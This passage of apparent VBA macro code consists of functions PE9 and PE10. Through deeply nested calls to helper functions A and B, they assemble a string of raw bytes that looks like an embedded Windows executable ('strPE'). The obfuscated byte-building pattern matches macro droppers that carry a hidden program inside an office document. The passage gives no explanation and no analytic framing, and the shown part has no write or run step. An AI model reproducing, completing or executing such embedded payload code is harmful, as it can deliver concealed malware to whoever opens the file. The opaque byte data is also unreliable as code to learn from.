    strPE = B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(B(strPE, "HCJB"), 159), 155), 146), 253), "'"), 147), "C"), 245), "ABIH/"), 145), "7CA"), 245), 253), "?"), 214), 252), 152), 145), "J"), 145), 155), 146), "J"), 214), 159), "@"), 249), "?J/IA"), 147), 146), 233), 31), "="), 0), 0), "V")
    strPE = A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(strPE, 28), 139), 4), 166), "/F "), 128), "8"), 202), 214), 22), 138), "U"), 1), "@"), 132), 210), "{("), 178), "F "), 234), 16), 202), 250), "-u"), 30), 4), 137), "N"), 12), 199), "F "), 232), 2), "A"), 0), 139), "M"), 16), 138), "F"), 16), "_^"), 136)
    strPE = A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(strPE, 1), 220), "~"), 17), 179), 0), "s"), 194), "1"), 0), 139), "V I}"), 12), 15), "9"), 2), 178), 131), 248), 176), 137), "F"), 16), 199), "8 "), 15), 132), 208), "b"), 0), 3), "PW"), 16), 21), "|"), 193), "@"), 0), 131), 196), 8), 133), 192), 15), 132)
    strPE = A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(strPE, 178), 0), 0), 0), 128), "x"), 3), ":"), 245), 26), 139), "MS"), 199), 1), 197), 183), "5"), 0), 30), 231), 23), "':"), 0), 15), 133), 146), 0), 0), 0), 233), 138), ")"), 0), 0), 128), 251), " "), 128), "8"), 193), "t"), 7), 139), "M"), 20), 137), 1), 235)
    strPE = A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(strPE, "t"), 139), "V"), 12), 139), "N"), 24), "B"), 139), "\"), 137), "V"), 12), "%"), 200), 127), "Y"), 199), "F"), 171), 212), 236), "A"), 8), 138), 7), "<Gu"), 19), 139), "E"), 16), 138), 145), 16), "__"), 136), 16), 184), "}"), 17), 1), 0), "]."), 16), "P"), 139)
    strPE = A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(strPE, "F"), 4), 133), 192), "t"), 31), 139), "V"), 28), 244), "N"), 16), "Q"), 139), 2), 219), 1), "P"), 210), 0), 0), 139), "N"), 8), "P"), 189), 232), "#@"), 16), 243), 255), "V"), 4), 131), 196), 16), 139), "E"), 16), "b"), 142), 16), "_^"), 136), 158), 184), "|"), 17)
    strPE = A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(strPE, 1), 0), "]"), 20), 16), 0), 139), ","), 28), 139), 20), 129), 139), "E"), 239), 137), 227), 199), "F "), 212), 2), "A"), 0), 255), "F"), 12), 139), "U"), 16), "{N"), 16), "_"), 194), 192), 136), 10), 131), 149), 194), 171), 0), 131), "~"), 246), "-"), 15), 132), 250)
    strPE = A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(strPE, 254), 255), 255), 139), "V "), 128), ":"), 0), 249), 16), 255), "F&"), 139), 127), 4), 133), 244), "t$"), 128), "t:t"), 131), 139), "N"), 28), 139), "F"), 16), "P"), 139), 166), "R"), 232), 145), "H"), 0), 0), "P"), 16), "F"), 8), "h"), 204), 243), "@"), 0)
    strPE = A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(strPE, 218), 255), "VM"), 131), 196), "`"), 139), "U"), 16), "iN"), 16), 6), 184), "|"), 17), 1), 0), 136), 10), "^]"), 194), 147), 0), 144), 144), 144), 144), 144), 144), 144), 144), 232), 144), "!"), 144), 252), 144), 153), 139), "lQ"), 164), "W`"), 245), 1), 0)
    strPE = B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(strPE, 0), 133), "e"), 15), 133), 253), 0), 0), 0), 175), ","), 220), 8), 170), 0), 20), 15), 140), 136), 236), 0), 0), 161), 132), 3), "A"), 0), 133), 192), 15), 133), 225), 0), 0), 0), 199), 5), 132), 3), "A"), 0), 1), 0), 0), "h"), 255), 21), "\"), 192), "@")
    strPE = B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(strPE, 0), 139), 240), 133), 246), 222), "P"), 28), "X"), 3), 214), 0), 133), 192), "y"), 29), "Ph"), 16), 193), "@"), 0), 228), 4), 232), 153), "K"), 0), 0), 131), 196), 12), 163), "X"), 3), "A"), 0), 133), 192), 15), 132), 175), 0), "@"), 0), 141), "_"), 252), 4), "V")
    strPE = A(B(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(strPE, 255), 208), 139), 240), 133), "bt"), 22), 139), "p"), 252), 139), "#"), 12), "RVP"), 232), ",H["), 0), 139), "M"), 8), 131), 19), 12), "VY"), 1), 29), 21), "X"), 192), "@$S"), 255), 21), "T"), 192), "@"), 0), 139), 216), "j"), 255), "S"), 255)
    strPE = A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(strPE, 21), "$"), 193), ","), 0), "P"), 232), 133), 0), 0), 0), 139), "4"), 16), 131), 196), 12), 29), 255), "t-"), 211), "4"), 133), "Tm"), 0), "DC"), 169), 21), "\"), 193), "@kN"), 196), 4), 137), 7), 255), 243), "$"), 193), "@"), 147), 156), "?"), 139), 206)
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 139), 23), 139), 209), 193), 233), 2), 243), 165), 139), 202), 131), 225), 3), 243), 164), "S"), 255), 21), "P"), 192), "@"), 0), 139), 26), 162), 193), "@"), 0), "'"), 214), 139), 8), "["), 133), 201), "t"), 22), 255), 214), 139), "8"), 231), 154), "]"), 199), 0), 0), 0), 0)
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(strPE, 0), 255), 21), "0"), 193), "@"), 0), 131), 196), 4), "L"), 192), "_^O"), 229), "]"), 194), 12), 0), "jJ"), 255), 21), "L"), 192), "@"), 0), "Cn"), 255), 255), 255), 144), 144), 144), 144), ","), 144), 144), 226), 144), 144), 144), 152), 139), 236), "Q"), 139), "E")
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(strPE, 12), 191), 139), "]"), 16), "V"), 133), 219), "WE"), 148), 187), 1), 0), 0), 0), "f"), 131), "8"), 0), "u"), 8), "j'"), 195), 2), 0), 127), 216), "C"), 131), 192), 2), 235), 237), "+E"), 12), 131), 192), 2), 209), "c"), 137), 148), 16), 141), 4), 244), 4)
    strPE = B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(strPE, 0), 0), 0), "P"), 255), 21), "\"), 193), "WN"), 139), 248), 139), "E"), 16), 141), "t"), 13), 1), "V"), 137), "u"), 252), 242), ")"), 164), 193), "@"), 0), 131), 157), 8), "yM"), 252), 137), 7), 141), "UBQP"), 139), "E"), 12), "RP"), 232), "4M")
    strPE = A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(strPE, 0), 0), 139), "U"), 252), 139), 7), "+=VP"), 255), 21), 237), 193), "@"), 251), 185), 1), 0), 25), 0), 24), 196), 199), ";"), 217), "=]>)"), 141), "^"), 255), 133), 166), 4), "/M"), 12), 3), 139), "P"), 252), 131), 138), ","), 137), 16), 139)
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(strPE, "0_"), 22), "F"), 8), 210), 137), 22), "U"), 245), 139), "U"), 12), 131), 192), 4), "J"), 137), "U"), 12), "u"), 225), 22), "Z"), 8), 199), 4), 143), 0), 0), 0), 0), 137), "8_"), 139), 138), "^"), 224), 139), 229), "]"), 1), 144), 247), 144), 144), 144), 144), 144)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 144), 144), "U"), 139), 236), 129), "$"), 152), 1), 0), 0), 161), 136), 3), "A"), 0), 139), 200), "@"), 133), 201), 163), 136), 3), 170), 0), "t"), 6), "3"), 192), 139), 229), "]"), 195), 141), "U"), 248), "R"), 232), 166), 134), 0), "c"), 16), 196), 4), 133), 192), 15), 133)
    strPE = A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(strPE, 130), 0), "C"), 0), "="), 21), "`"), 192), "@"), 0), 163), "T/A"), 140), 232), 220), 233), 255), ":"), 133), 192), "1sPPP"), 141), "E"), 252), 140), 232), 236), 239), 255), 255), 133), ":t"), 9), 184), 34), "N0"), 0), 139), 229), "5"), 195), 139)
    strPE = B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(strPE, "M"), 252), "1$"), 244), "@"), 240), "Q"), 232), "\"), 246), 255), 255), 141), 149), "h"), 254), 255), 255), "Rju"), 255), 21), 208), 193), "@"), 0), 133), 192), "u9f"), 139), 244), "B"), 254), 13), 255), 186), 18), "u#3"), 201), 138), 204), 132), 201), "u")

    PE9 = strPE
End Function

Private Function PE10() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(strPE, 27), 139), "R3R"), 232), "bD"), 0), 0), 139), "E"), 252), "P"), 232), "iD"), 0), 0), 131), 196), ")3"), 192), 157), 229), "]"), 195), 255), 21), "V"), 193), "@"), 244), "["), 17), 0), 0), 0), 5), 229), "]"), 195), 144), "x"), 136), 194), "A"), 0), "H")
    strPE = A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(strPE, 163), 136), 3), "A"), 0), "u"), 23), 232), 2), 234), "C"), 255), 255), 21), 212), 193), "@"), 0), 161), 248), 9), "A"), 0), "P"), 255), 21), "d"), 192), "@"), 0), 195), 162), 144), 144), 144), 144), 144), 144), 144), "v"), 174), ".U"), 5), 236), ","), 196), 223), "W"), 168)
    strPE = A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(strPE, 1), "t"), 19), 139), "/"), 8), "_"), 199), 220), 0), 0), 0), 0), 184), 135), 17), "U"), 190), "]"), 194), 16), 0), 139), "}"), 12), 129), 255), 250), 254), 198), "Wv"), 19), 139), "M"), 8), 184), 22), 0), 0), 0), "_"), 199), 1), 198), 157), "C"), 0), "]"), 194)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(strPE, 16), 0), "S"), 139), "]"), 199), "~h$0"), 0), 0), 9), 247), 4), "'G"), 255), 139), "u"), 8), "V"), 201), 137), 6), 137), "H"), 4), 139), 22), 137), "K"), 8), "G"), 6), 141), "<"), 191), 137), 24), 139), 22), 193), 231), 2), 137), "J"), 12), 139), 6)
    strPE = A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "Wq"), 137), 136), 16), 253), 0), 0), 139), 160), 137), 138), 20), " "), 34), 0), 139), 6), 137), 136), 24), "0"), 0), 230), 232), 199), 233), 255), "|"), 139), 14), 174), "Sr"), 129), 28), "0"), 0), 0), 232), "!"), 233), 255), 255), "<"), 22), "^[_"), 232)
    strPE = A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(strPE, 130), " "), 250), 251), ";3"), 192), "]"), 137), 16), 0), 144), 144), 144), 144), 144), 144), 144), "U"), 139), 236), 139), "E"), 8), "SV"), 234), 220), "H"), 4), 139), "P"), 8), ";"), 202), "u"), 12), "_^"), 131), 12), 0), 0), 0), "[]"), 203), 8), 0), 139)
    strPE = A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 144), 28), 162), 0), 220), 139), "]"), 6), 141), 12), 137), 139), 243), 141), "<_"), 185), "3"), 0), 212), 0), 243), "f"), 139), "S"), 155), "="), 1), 0), 0), "j"), 9), 209), 201), 133), 226), 0), 0), 0), 139), "S"), 12), 139), "z"), 4), 138), "S"), 235), "M"), 209)
    strPE = A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(B(strPE, "t/"), 139), "P,3"), 201), 133), 210), "v"), 249), 141), "p"), 16), "9>t"), 241), "A"), 131), 198), 4), ";"), 202), "r"), 244), ";"), 202), "u"), 19), 129), 209), 0), 4), 0), 0), "s"), 11), 137), "|"), 136), 16), 139), 8), 12), "A"), 137), 198), 12), 168)
    strPE = A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(strPE, "C"), 211), 4), "t>"), 139), 211), 16), 16), 0), 10), "3"), 201), 133), 210), "v"), 137), 141), 195), 150), 16), 0), 0), "9>f"), 8), 158), 131), 198), 4), ";"), 253), "rL;"), 202), "u"), 28), 129), 142), 0), 129), ","), 0), "s"), 20), 137), 188), 136)
    strPE = B(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 20), 16), 0), 224), 139), 136), 16), 16), 0), 0), "A"), 137), 136), 16), 132), 0), "p"), 246), "C"), 172), "r"), 6), ">"), 139), 144), 20), " "), 0), "F"), 205), 201), 133), 240), "v"), 18), 141), 176), 243), " "), 166), 0), "9Qt"), 8), "A"), 131), 198), 4), ";")
    strPE = A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(strPE, 202), 189), "Z;"), 202), "u"), 28), 129), 250), 0), 4), 0), 0), 129), 237), 137), 188), 136), ". "), 0), 0), 139), 136), 20), " "), 151), 0), "A"), 137), 228), 20), " ("), 0), ";"), 184), 24), "0"), 0), 0), "~"), 6), 137), 184), 200), "0"), 0), 148), 139)
    strPE = B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(strPE, "H"), 163), "_A"), 218), 137), "H"), 4), "3"), 26), "[]"), 194), 8), 0), "_^"), 184), 9), 0), 0), 0), "["), 158), 194), 8), 0), 144), 144), 144), 189), 144), 144), 144), 144), 144), 144), 144), "U"), 159), 236), 131), 236), 8), 139), "E.S"), 7), "W")
    strPE = A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(strPE, 131), "x"), 4), "z"), 15), 133), "w"), 1), 0), 0), 26), 15), 12), 139), 26), 8), "3"), 201), 139), 130), 4), 139), "{"), 4), 133), 210), 137), "}"), 8), 175), 21), 139), 176), 28), "0"), 0), 0), 131), 198), "y;"), 219), "t"), 22), "A"), 131), "a"), 20), ";"), 202)
    strPE = A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(strPE, 10), "Q_^"), 184), 127), 17), 1), 0), "[P"), 242), "]"), 194), 223), 153), 139), 217), "A"), 141), "r"), 255), ";"), 202), 137), "p"), 4), "sO"), 141), 0), 155), 141), "<"), 137), 193), 172), 2), 193), 231), 2), "+"), 209), 137), "}"), 8), 127), "U"), 252), 139)
    strPE = A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(strPE, 136), 28), 12), 0), 139), 139), "U"), 12), 139), "R"), 12), 141), "4"), 15), ";V"), 4), "u"), 5), ";>"), 4), 235), 16), 141), "3"), 11), 148), 5), 0), 0), "2"), 243), 165), 12), 222), 198), 131), 195), "p"), 139), "M"), 252), 131), 199), 20), "I"), 137), "}"), 8)
    strPE = A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(strPE, 137), "M"), 252), 129), 200), 207), "y"), 149), 139), "P"), 202), "3"), 201), 254), 210), "vq"), 141), "p"), 16), "9>t"), 10), 181), 131), 198), 4), ";"), 202), "r"), 244), 235), 29), "J;"), 202), "s"), 199), 141), "TB"), 210), 139), "r"), 4), "A"), 137), "2"), 248)
    strPE = A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(strPE, "p"), 12), 131), 194), 4), "N;"), 206), "f"), 239), 255), "H"), 12), 139), "-"), 16), 16), 201), 0), 141), 201), 133), 210), "v:"), 141), 176), 181), 16), 0), 0), "9>a"), 10), "A"), 131), 198), "#;"), 202), "r"), 244), 235), 147), "J;us"), 27)
    strPE = A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(strPE, 141), 148), 136), 151), 179), 181), 0), 139), "r"), 4), "A"), 137), "23"), 176), ","), 16), 0), 227), 131), 194), 4), "N;"), 206), "r"), 236), 255), 136), 16), 16), 0), 0), 139), 144), 20), " "), 0), 224), "3"), 201), 133), "?v"), 225), 141), 176), 24), "?"), 0)
    strPE = A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(strPE, 0), "9>t"), 10), "A"), 131), 198), 4), ";"), 202), "r"), 244), 235), "&J;ns"), 27), 141), 148), 136), 24), " "), 0), 0), 139), "r"), 4), "A"), 137), "2"), 139), 231), 20), " "), 204), 242), 131), "g"), 4), "N>"), 206), "r"), 236), "K5"), 20)
    strPE = A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(strPE, " "), 0), 178), 139), 136), 24), "0"), 0), 153), ";"), 249), "u0"), 133), 201), "~"), 7), "I"), 137), 136), 24), "0E"), 230), "_^3"), 192), "["), 139), 229), "]"), 194), 8), 0), "_^"), 154), 9), 17), 0), 0), "["), 139), 229), "]"), 194), 8), 0), 144)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 144), 144), 144), 169), "U"), 139), 0), 184), 152), "0"), 0), 0), 1), 147), "TN"), 0), "S"), 139), "]f_W"), 139), "Cm"), 133), 192), "F"), 20), 139), "c"), 20), "_^["), 199), 0), 0), 0), 0), 0), "3"), 245), 139), 229), 14), 194), 20), 0)
    strPE = B(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(strPE, 139), "u5r}"), 12), 133), 239), "K"), 159), "|W"), 133), 255), "s 3"), 192), "*%j"), 0), "h@"), 188), 15), 0), "VW"), 232), 206), "Q"), 0), 0), "{"), 0), "h"), 3), "B"), 15), "zV"), 213), 137), "E2"), 232), "OS3")
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(strPE, 0), 137), "E"), 240), "J"), 193), 236), 185), 1), "D"), 0), "I"), 141), "s"), 144), 141), 189), "23"), 255), "k"), 215), 9), 165), 185), 1), 4), 228), 0), 141), 158), 16), 16), 0), 214), 141), 189), 232), 239), 255), 255), 141), "*"), 232), 206), 255), 255), 243), 165), 185)
    strPE = A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 246), 4), 0), 0), 141), 159), 20), " "), 0), 0), 141), 189), 224), 207), 255), 255), 141), 133), 228), 223), 255), 255), 194), 165), 141), 141), 224), 207), 255), 164), 242), 139), 139), 24), "0"), 0), 0), "R"), 12), 228), "Q"), 255), 21), "o"), 193), "@7"), 139), "U"), 20)
    strPE = B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(strPE, "3"), 255), ";"), 199), 192), 2), "} "), 173), "5"), 216), 193), "@"), 232), 255), 214), 133), 192), 15), 132), "W%"), 0), 0), 255), 214), "_^"), 5), 128), 252), 10), 0), "["), 139), 229), 0), "`"), 20), 0), "u"), 14), "U^"), 184), "w"), 17), 1), 0), "[")
    strPE = A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(strPE, "N"), 209), "]"), 176), 20), 0), 139), 34), 4), "<m"), 16), ";"), 199), 3), "}"), 248), 15), 134), "7"), 1), "`"), 0), 137), "}"), 8), 137), "}"), 252), 139), 131), 28), "0"), 0), "_"), 241), 199), "$D"), 9), 139), 15), 133), 25), 1), 0), 0), 146), "H"), 12)
    strPE = A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(strPE, 141), 149), 228), "M"), 255), 7), "R0q"), 4), "V"), 137), 139), 244), 199), 133), "T"), 0), 0), "}"), 192), "u&"), 141), 133), 228), 239), 255), 255), "PV"), 232), "t4"), 0), 0), 134), 192), "us"), 141), 141), 224), 207), 255), 255), "c"), 127), 232), 11)
    strPE = A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "T"), 0), 228), 133), 192), 15), 132), 157), 0), 0), 0), 12), 179), 28), "0N"), 127), 186), "E"), 8), 3), 247), 139), 149), " 0"), 197), 0), 3), 248), 185), 5), "6"), 127), 0), 243), 165), 139), 147), " 0"), 0), 0), 139), "}|f"), 199), "D"), 2)
    strPE = A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 10), 0), 0), 141), "."), 228), 223), 255), 255), "PW"), 232), 136), "T"), 0), "z"), 139), "u"), 8), 197), 192), 153), 15), 139), "a"), 153), 234), 0), 0), 128), "L1"), 10), 1), "nD"), 244), 10), 141), 176), 12), 239), "/"), 255), "RWp"), 1), "T"), 0)
    strPE = B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(strPE, 145), 133), 192), "t"), 15), 139), 131), " "), 144), 0), 0), "L\0"), 10), 4), "#D0"), 230), 141), 141), 224), 207), 255), 255), "QW"), 232), 225), "S"), 0), 0), 151), 244), "t"), 15), 139), 147), " 0"), 0), 0), 128), "'2"), 10), 139), 141), "D")
    strPE = A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(strPE, "C"), 200), 139), "."), 16), 139), "}"), 132), "A"), 131), 198), 20), 137), "M"), 16), 137), "u"), 8), 139), "E"), 248), 139), "K"), 4), "@"), 131), 199), 20), "^"), 25), 137), "E"), 248), 137), "}"), 252), "#"), 130), 249), 254), "~"), 255), "9"), 255), 139), "M"), 20), 139), "E"), 16)
    strPE = B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(strPE, 253), 1), 139), "E"), 24), ";,t"), 8), 139), 147), " "), 31), "L"), 0), 137), 17), "_^3"), 192), 31), 139), 5), "]"), 194), 20), 0), "_^"), 184), 9), 0), 0), 0), "H"), 139), 229), "]"), 194), 20), 230), "H"), 144), 144), 144), "U"), 139), 236), "S")
    strPE = A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(strPE, "VW"), 139), "}"), 12), 133), 255), "u"), 5), 191), 2), 0), 175), 0), 139), "E"), 24), 139), "u"), 8), ")V"), 23), "q"), 179), 0), 0), 139), "]"), 202), 139), "M"), 201), 131), 196), 8), "SQW"), 255), 21), 188), 193), "@"), 0), 169), 22), 137), "W"), 4)
    strPE = B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(strPE, 139), 6), 139), "@"), 4), 184), 248), 255), "u"), 30), 139), "5"), 216), 15), 188), 153), 255), 214), 238), "Y"), 15), 14), 148), 0), 0), 0), 255), "H_^3M"), 252), 10), 194), "[]"), 194), 20), 0), 131), "=&"), 8), 199), 0), 20), 184), 238), "j")
    strPE = B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(strPE, 179), "v"), 1), "P"), 255), 21), "p"), 192), "@*"), 235), "6"), 255), 21), "l"), 192), "@"), 0), 139), 22), 11), 2), "j"), 0), 141), "M"), 12), "j"), 0), "Q#J"), 4), 29), "QP"), 255), 21), "h"), 192), 180), 0), 28), 192), 134), 20), 139), 22), 139), "B")
    strPE = A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(strPE, 4), "P"), 255), 21), 192), 193), "@"), 0), 139), 14), "4U"), 189), 137), 222), 4), 162), "E"), 135), ","), 14), "SP"), 193), "Q"), 232), 152), 219), 174), 0), 139), 22), 131), 200), 255), 131), 196), 217), "0"), 234), " "), 180), " WR"), 0), "h"), 224), "f"), 208)
    strPE = B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(B(strPE, "m"), 137), "B$"), 139), 6), 199), "@("), 0), 0), 0), 0), "o6P"), 139), 14), "Q"), 232), ","), 239), 255), 255), "_^"), 192), 5), "[]"), 194), 20), 22), 144), 144), "DU"), 139), 236), "V"), 139), 220), "("), 139), "F"), 4), 131), 248), 255), "t")
